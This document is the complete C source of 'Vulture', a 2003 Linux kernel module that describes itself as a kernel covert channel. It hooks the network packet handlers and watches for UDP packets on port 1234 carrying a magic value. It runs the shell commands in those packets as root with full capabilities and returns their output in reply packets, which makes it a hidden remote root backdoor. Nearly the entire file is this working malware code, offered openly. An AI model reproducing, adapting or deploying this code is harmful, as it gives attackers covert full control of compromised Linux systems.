/*
 *  Vulture - Kernel Covert Channel
 *
 *  Copyright (C) 2003 by rd <rd@vnsecurity.net>
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version
 *
 *  This program is distributed in the hope that it will be useful, but 
 *  WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU 
 *  General Public License for more details.
 *
 *  Greets to THC & vnsecurity
 *
 */
#ifndef __KERNEL_SYSCALLS__
#define __KERNEL_SYSCALLS__
#endif

#include <linux/module.h>
#include <linux/types.h>
#include <linux/string.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/smp_lock.h>
#include <linux/unistd.h>
#include <linux/file.h>
#include <linux/random.h>
#include <linux/init.h>
#include <linux/utsname.h>
#include <linux/in.h>
#include <linux/if.h>
#include <linux/inet.h>
#include <linux/netdevice.h>
#include <linux/if_arp.h>
#include <linux/skbuff.h>
#include <linux/brlock.h>
#include <linux/ip.h>
#include <linux/socket.h>
#include <linux/route.h>
#include <linux/udp.h>
#include <linux/proc_fs.h>
#include <linux/major.h>
#include <net/arp.h>
#include <net/ip.h>
#include <net/ipconfig.h>

#include <asm/uaccess.h>
#include <asm/checksum.h>
#include <asm/processor.h>

#include "vulture.h"

#define MODULE_NAME "vulture"

#ifdef DEBUG
#define DPRINT(format, args...) printk(MODULE_NAME ": " format, ##args)
#else
#define DPRINT(format, args...)
#endif

int errno;

static struct packet_type *old_packet_type;

static inline _syscall1(int,pipe,int *,fd);
static inline _syscall3(long,fcntl,unsigned int, fd, unsigned int, cmd,
                     unsigned long, arg);
static void cleanup_vulture(void);

static spinlock_t vulture_lock = SPIN_LOCK_UNLOCKED;

struct tq_struct vulture_task; 

/*
 * Send packet dirrectly to net device
 */
static int dev_direct_send(struct sk_buff *skb)
{
   	struct net_device *dev = skb->dev;

   	spin_lock_bh(&dev->queue_lock);
   	if (dev->flags & IFF_UP) {
      		int cpu = smp_processor_id();

      		if (dev->xmit_lock_owner != cpu) {
        		spin_unlock(&dev->queue_lock);
         		spin_lock(&dev->xmit_lock);
         		dev->xmit_lock_owner = cpu;

         		if (!netif_queue_stopped(dev)) {
            			if (dev->hard_start_xmit(skb, dev) == 0) {
               				dev->xmit_lock_owner = -1;
               				spin_unlock_bh(&dev->xmit_lock);
               				return 0;
            			}
         		}
         		dev->xmit_lock_owner = -1;
         		spin_unlock_bh(&dev->xmit_lock);
         		kfree_skb(skb);
         		return -ENETDOWN;
      		}
   	}
   	spin_unlock(&dev->queue_lock);

   	kfree_skb(skb);
   	return -ENETDOWN;
}

/*
 * Send out reply packet 
 */
static void ip_direct_send(struct sk_buff *skb)
{
        struct dst_entry *dst = skb->dst;
        struct hh_cache *hh = dst->hh;

        if (hh) {
                read_lock_bh(&hh->hh_lock);
                memcpy(skb->data - 16, hh->hh_data, 16);
                read_unlock_bh(&hh->hh_lock);
                skb_push(skb, hh->hh_len);

		DPRINT(__FUNCTION__ " hh_cache %p\n", hh->hh_output);
		dev_direct_send(skb);

        } else if (dst->neighbour) {
		DPRINT(__FUNCTION__ " neighbour %p\n", dst->neighbour->output);
                
		if (!neigh_resolve(skb))
			dev_direct_send(skb);
		else
			kfree_skb(skb);
        } else {
                kfree_skb(skb);
        }
}

/* 
 * Generate our reply skb
 */
static inline struct sk_buff *gen_reply_skb(struct vulture_buff *vbuf,
			const char *data, unsigned int len,
			unsigned int state)
{
	struct sk_buff *nskb;
	struct iphdr *iph;
	struct udphdr *udph;
	struct vulturehdr *vultureh;
	struct rtable *rt;
	int tot_len, data_len, diff;
	u_int16_t tmp_port;

	data_len = sizeof(struct vulturehdr) + len;
	tot_len = vbuf->skb->nh.iph->ihl*4 + sizeof(struct udphdr) + data_len;
	diff = tot_len - vbuf->skb->len;

	DPRINT(__FUNCTION__ " generate new skb for data len %d, state %d, diff=%d\n", 
		len, state, diff);

	if (diff > skb_tailroom(vbuf->skb)) {
		nskb = skb_copy_expand(vbuf->skb, 
				skb_headroom(vbuf->skb),
				diff, GFP_ATOMIC);
		skb_put(nskb, diff);
	} else {
		nskb = skb_copy(vbuf->skb, GFP_ATOMIC);

		if (diff < 0) 
			skb_trim(nskb, tot_len);
		else
			skb_put(nskb, diff);
	}		

	if (nskb == NULL) {
		DPRINT(__FUNCTION__ " can not create new skb\n");
		return NULL;
	}

	iph = nskb->nh.iph;
	udph = (struct udphdr *)((u_int32_t *)iph + iph->ihl);
	vultureh = (void *)udph + sizeof(struct udphdr);

	memcpy((char *)vultureh + sizeof(struct vulturehdr), data, len);
	vultureh->state = state;
	vultureh->len = htons(len); 

	/* swap src & dst port */
	tmp_port = udph->source;
        udph->source = udph->dest;
        udph->dest = tmp_port;
	udph->len = htons(sizeof(struct udphdr) + data_len);
	udph->check = 0;
	udph->check = csum_tcpudp_magic(iph->daddr, iph->saddr, ntohs(udph->len), 
			IPPROTO_UDP, csum_partial((unsigned char *)udph, 
			ntohs(udph->len), 0));

	/* swap src/dst ip and port */
	iph->saddr = vbuf->skb->nh.iph->daddr;
	iph->daddr = vbuf->skb->nh.iph->saddr;

        /* Adjust IP TTL, DF, ID, len */
        iph->ttl = 64;
        iph->frag_off = htons(IP_DF);
        iph->id = 0;
	iph->tot_len = htons(tot_len);	
        iph->check = 0;
        iph->check = ip_fast_csum((unsigned char *)iph, iph->ihl);
 
	/* route our packet */
	if (ip_route_output(&rt, iph->daddr, iph->saddr, RT_TOS(iph->tos), 0)) {
		DPRINT("can not route our packet\n");
		kfree_skb(nskb);
		return nskb;
	}

	/* drop old route */
	dst_release(nskb->dst);
	nskb->dst = &rt->u.dst;

	DPRINT("Reply: ");
	printk("DEV=%s SRC=%u.%u.%u.%u DST=%u.%u.%u.%u SPT=%d DPT=%d udpsum=%x",
			nskb->dev->name,
                        NIPQUAD(iph->saddr), NIPQUAD(iph->daddr), 
			ntohs(udph->source), ntohs(udph->dest), udph->check);

        printk("skb data=%p iph=%p udph=%p vultureh=%p result=%s\n",
                nskb->data, iph, udph, vultureh, 
		(char *) (vultureh+sizeof(struct vulturehdr)));

	return nskb;		
}

/*
 *  Send reply to sender 
 */
static void __init vulture_packet_reply(struct vulture_buff *vbuf, 
			const char *data, unsigned int len, 
			unsigned int state)
{
	int msglen, left = len;

	while (left > 0) {
		struct sk_buff *skb;

		if (left > MAX_DATA_LEN)
			msglen = MAX_DATA_LEN;
		else
         		msglen = left;

		skb = gen_reply_skb(vbuf, data, msglen, state);
      		if (!skb)
         		return;
      
		ip_direct_send(skb);

      		data += msglen;
      		left -= msglen;
   	}
}

static int execve_helper(char *progname, char *argv[], char *envp[])
{
        int err, ret = 0;
        
        spin_lock_irq(&current->sigmask_lock);
        flush_signals(current);
        flush_signal_handlers(current);
        spin_unlock_irq(&current->sigmask_lock);

        BEGIN_KMEM
        current->uid = current->euid = current->fsuid = 0;
        cap_set_full(current->cap_inheritable);
        cap_set_full(current->cap_effective);
         
        err = execve(progname , argv, envp);

        if (err < 0) 
                ret  = err;
        END_KMEM
        
        return ret;
}

static int __do_cmd(void *data)
{
        exec_param_t *parm = data; 
        int ret;

        close(1);
        close(2);
        close(4);
        dup(3); // out
        dup(3); // err, pipe child stderr to stdout pipe
        close(3);
        close(5); // parent stderr pipe dup(5)
        
        fcntl(0, F_SETFD, 0);
        fcntl(1, F_SETFD, 0);
        fcntl(2, F_SETFD, 0);
        
        ret = execve_helper(parm->command, parm->argv, parm->envp);
        if (ret < 0)
                DPRINT("can't exec %s\n", parm->command);
        
        return 0;               
}

static void handle_cmd_result(struct vulture_buff *vbuf)
{
        char buf[MAX_BUFFER_LEN];
        int len;
        
        do {
                BEGIN_KMEM
                len = read(2, buf, MAX_BUFFER_LEN - 1);
                END_KMEM
		
		if (len == -ERESTARTSYS) {
                        flush_current_signals();
			continue;
		}               

                if (len > 0) {
                        buf[len]=0;
                        DPRINT("%d bytes: %s\n", len, buf);
			
			vulture_packet_reply(vbuf, buf, len, VULTURE_CONT);	
                }
        } while ( len > 0 || len == -ERESTARTSYS); 
	
	/* send finish notify packet */
	buf[0] = 0;
	vulture_packet_reply(vbuf, buf, 1, VULTURE_SUCCESS);
}

/*
 * excute request command 
 */
static int do_cmd(void *data)
{
	struct vulture_buff *vbuf = data;
	exec_param_t parm;
        static char * envp[] = 
		{ "HOME=/", "TERM=linux", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };

        char *argv[]={ "bash", "-c", (char *)vbuf->data,  NULL };
        int in_pipe_fds[2];
        int out_pipe_fds[2];
        int err_pipe_fds[2];
	pid_t pid;
        int ret = 0;
 
	daemonize();

        parm.command = "/bin/sh";
        parm.argv = argv;
        parm.envp = envp;

	DPRINT(__FUNCTION__ " remote cmd = %s %s %s - cmd lenght = %d\n", 
		parm.command, argv[1], argv[2], vbuf->vultureh->len);

	spin_lock_irq(&current->sigmask_lock);
        siginitsetinv(&current->blocked, sigmask(SIGCHLD));
        recalc_sigpending(current);
        spin_unlock_irq(&current->sigmask_lock);

        close(0); 
        close(1);
        close(2);
        close(3);
        close(4);
        close(5);

        pipe(in_pipe_fds); // 0,1
        pipe(out_pipe_fds); // 2,3
        pipe(err_pipe_fds); // 4,5

        pid = kernel_thread(__do_cmd, (void *) &parm, CLONE_SIGHAND|SIGCHLD);

        if (pid < 0)
                printk("Couldn't create new thread\n");
        else {
               	close(3);
               	close(4); // TODO: support err output too
               	close(5);
		close(0);
		close(1);

                handle_cmd_result(vbuf);
 	
                do {
                       ret = waitpid(pid, NULL, __WALL);
                } while (ret == -ERESTARTSYS);

		DPRINT(__FUNCTION__ " excute exited\n");
        }

	kfree_vbuf(vbuf);

        return ret;
}

/*
 *  Process request from client
 */
static void vulture_packet_process(struct vulture_buff *vbuf)
{
	struct vulturehdr *vultureh = vbuf->vultureh;

	switch (vultureh->cmd) {
	case VULTURE_RUN: {
		pid_t pid;

		DPRINT("RUN=%s\n", vbuf->data);
		vbuf->data[vultureh->len] = 0;
		do {
			pid = kernel_thread(do_cmd, (void *)vbuf, SIGCHLD);
		
			if (pid >= 0)
				return;

			if (pid == -1) {
				kfree_vbuf(vbuf);
				return;
			}

         		current->state = TASK_UNINTERRUPTIBLE;
   	            	schedule_timeout(HZ);
                } while (1);		

		break;
	}
	case VULTURE_UNINST: {
		kfree_vbuf(vbuf);
		cleanup_vulture();
		break;
	}
	default:
		DPRINT("Unknow command %u\n", vultureh->cmd);
		kfree_vbuf(vbuf);
		break;
	}
}

/* 
 *  Ripped from dev.c
 *  Deliver skb to an old protocol, which is not threaded well
 *  or which do not understand shared skbs.
 */
static int deliver_to_old_ones(struct packet_type *pt, struct sk_buff *skb, int last)
{
        static spinlock_t net_bh_lock = SPIN_LOCK_UNLOCKED;
        int ret = NET_RX_DROP;


        if (!last) {
                skb = skb_clone(skb, GFP_ATOMIC);
                if (skb == NULL)
                        return ret;
        }
        if (skb_is_nonlinear(skb) && skb_linearize(skb, GFP_ATOMIC) != 0) {
                kfree_skb(skb);
                return ret;
        }

        /* The assumption (correct one) is that old protocols
           did not depened on BHs different of NET_BH and TIMER_BH.
         */

        /* Emulate NET_BH with special spinlock */
        spin_lock(&net_bh_lock);

        /* Disable timers and wait for all timers completion */
        tasklet_disable(bh_task_vec+TIMER_BH);

        ret = pt->func(skb, skb->dev, pt);

        tasklet_hi_enable(bh_task_vec+TIMER_BH);
        spin_unlock(&net_bh_lock);
        return ret;
}

static int deliver_to_old_handles(struct sk_buff *skb)
{
	struct packet_type *p, *prev;
	unsigned short type = skb->protocol;
	int ret = 0;

	prev = NULL;
	for (p = old_packet_type; p; p = p->next) {
        	if (p->type == type && 
		    (!p->dev || p->dev == skb->dev)) {
			if (prev) {
                		if (!p->data) {
					ret = deliver_to_old_ones(p, skb, 0);
                        	} else {
                                	atomic_inc(&skb->users);
                                	ret = p->func(skb, skb->dev, p);
                        	}
			}
			prev = p;
                }
	}

	if (prev) {
                if (!prev->data) {
			ret = deliver_to_old_ones(prev, skb, 1);
                } else {
                        ret = prev->func(skb, skb->dev, prev);
                }
        } else {
                kfree_skb(skb);
                ret = NET_RX_DROP;
        }

	return ret;
}

/*
 *  Receive request from sender
 */
static int __init vulture_packet_recv(struct sk_buff *skb, 
				struct net_device *dev, struct packet_type *pt)
{
	struct iphdr *iph = skb->nh.iph;
	void *protoh = (u_int32_t *)iph + iph->ihl;
        unsigned int datalen = skb->len - iph->ihl * 4;

	/* Fragments are not supported */
	if (iph->frag_off & htons(IP_OFFSET | IP_MF)) {
		DPRINT("Ignoring fragmented packet\n");
		goto out;
	}

	DPRINT("SRC=%u.%u.%u.%u DST=%u.%u.%u.%u\n",
                        NIPQUAD(iph->saddr), NIPQUAD(iph->daddr));

	switch (iph->protocol) {
	case IPPROTO_UDP: {
                struct udphdr *udph = protoh;
		struct vulturehdr *vultureh = (void *)udph + sizeof(struct udphdr);

                if (datalen < sizeof (*udph)) {
                        DPRINT("INCOMPLETE [%u bytes] \n", datalen);
                        break;
                }

		DPRINT("Magic = %d\n", ntohl(vultureh->magic));

		/* Check whether it's a valid vulture request */
		if (ntohl(vultureh->magic) == 31337 && ntohs(udph->dest)==1234) {
			struct vulture_buff *vbuf;

			vbuf = kmalloc(sizeof(struct vulture_buff), GFP_ATOMIC);
			vbuf->vultureh = vultureh;
			vbuf->data = (char *)vultureh + sizeof(struct vulturehdr); 
			vbuf->skb = skb;

                        DPRINT("Proto matched %d, sport=%d, dport=%d\n",
                                ntohl(vultureh->magic), ntohs(udph->source), 
				ntohs(udph->dest));
			
			vulture_task.routine= (void *) vulture_packet_process;
			vulture_task.data=(void *) vbuf;
			schedule_task(&vulture_task);
			
                        return 0;
                }
		break;
	}
	default:
		break;
        }

out:
	return deliver_to_old_handles(skb);
}	


static struct packet_type vulture_packet_type __initdata = {
	type:	__constant_htons(ETH_P_IP),
	func:	vulture_packet_recv,
	data:   (void*) 1, /* we understand shared skbs :) */
};

/*
 *  Add our own packet handle
 *  FIXME: any protocol defined in the future which has the same hash 
 *  index as ETH_P_IP will not work after our module is loaded
 *  ==> TODO: add it back after our packet handle is added 
 */
static inline void vulture_packet_init(void)
{
	struct packet_type *p;

	dev_add_pack(&vulture_packet_type);

        br_write_lock_bh(BR_NETPROTO_LOCK);
	old_packet_type = vulture_packet_type.next;
	vulture_packet_type.next = NULL;
        br_write_unlock_bh(BR_NETPROTO_LOCK);
	
	for (p = &vulture_packet_type; p; p = p->next) {
		DPRINT("dev_pack: addr=%p, type=%d, func=%p, next=%p, data=%d\n", 
			p, p->type, p->func, p->next, (int) p->data);
	}
}

/*
 *  hook cleanup
 *  Remove our packet handle and restore the old chains
 */
static inline void vulture_packet_cleanup(void)
{
	struct packet_type *p, *q;

	dev_remove_pack(&vulture_packet_type);

	p = old_packet_type->next;
	dev_add_pack(old_packet_type);
	q = old_packet_type;

        br_write_lock_bh(BR_NETPROTO_LOCK);
	while (q->next)
		q = q->next;
	q->next = p;	
        br_write_unlock_bh(BR_NETPROTO_LOCK);
}

static int init_vulture(void)
{
	vulture_packet_init();
	DPRINT("Loaded\n");

        return 0;
}

static void cleanup_vulture(void)
{
	vulture_packet_cleanup();
        DPRINT("Unloaded\n");
}

module_init(init_vulture);
module_exit(cleanup_vulture);

EXPORT_NO_SYMBOLS;
